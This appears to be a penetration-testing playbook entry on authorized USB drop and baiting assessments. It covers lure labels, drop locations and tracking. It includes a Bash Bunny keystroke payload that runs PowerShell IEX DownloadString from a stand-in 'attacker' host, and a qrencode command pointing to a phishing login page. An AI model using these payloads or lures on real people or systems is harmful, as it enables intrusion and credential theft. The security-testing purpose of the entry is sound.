# Physical — USB Drop / Baiting

## When this applies

Authorized assessment dropping crafted USB devices in or around the target premises to measure rates of plug-in, AutoRun, and credential-execution. Tests USB control policies, AutoRun settings, endpoint protection, and user awareness.

**MITRE ATT&CK**: T1091 (Replication Through Removable Media), T1189 (Drive-by Compromise).

## Technique

Prepare USB devices (mass-storage with an enticing filename, HID-injection devices like Rubber Ducky, or hybrid HID+storage like Bash Bunny) and place in high-traffic areas where employees are likely to find them.

## Steps

1. Define target locations and quantities; pre-mark each device with a hidden ID for tracking.
2. Build payload appropriate to scope:
   - **Mass storage** with a tracked link inside a doc (e.g. an HTML/PDF that beacons on open).
   - **HID injection** that types a `powershell IEX (New-Object Net.WebClient).DownloadString(...)` and pulls a beacon from an authorized C2.
3. Label drives convincingly: `Executive Salaries 2024`, `Confidential - HR`, `Q4 Financial Results`, `Employee Performance Reviews`.
4. Deploy: parking lot, reception, conference room, cafeteria, near entrances/exits, mail room.
5. Track: device picked up / inserted / payload executed / beacon received.
6. Recover devices, document, debrief.

### Bash Bunny payload skeleton

```
ATTACKMODE HID STORAGE
RUN WIN powershell
Q DELAY 1000
Q STRING IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
Q ENTER
```

### Malicious QR card (companion baiting)

```bash
qrencode -o qrcode.png "https://phishing-site.com/login"
# deploy via fake parking-violation, fake delivery notice, event poster, bathroom stall sticker
```

## Verifying success

- Device beacon received from corporate IP / corporate hostname.
- Tracked file open from inside the target network.
- USB-block policy logs a denial event (also a useful positive result).

## Common pitfalls

- Weaponized devices crossing legal boundaries — scope and authorization in writing.
- Beacons reaching out from personal devices, BYOD, or visitor laptops — filter by IP/AD context.
- Forgetting to retrieve unfound devices at end of test (security risk + scope creep).

## Tools

- USB Rubber Ducky / Bash Bunny / Flipper Zero (HID injection)
- Standard mass-storage USB sticks (with tracked-document payload)
- `qrencode` for malicious QR companion deployment
- C2 / beacon framework configured to log only in-scope hosts
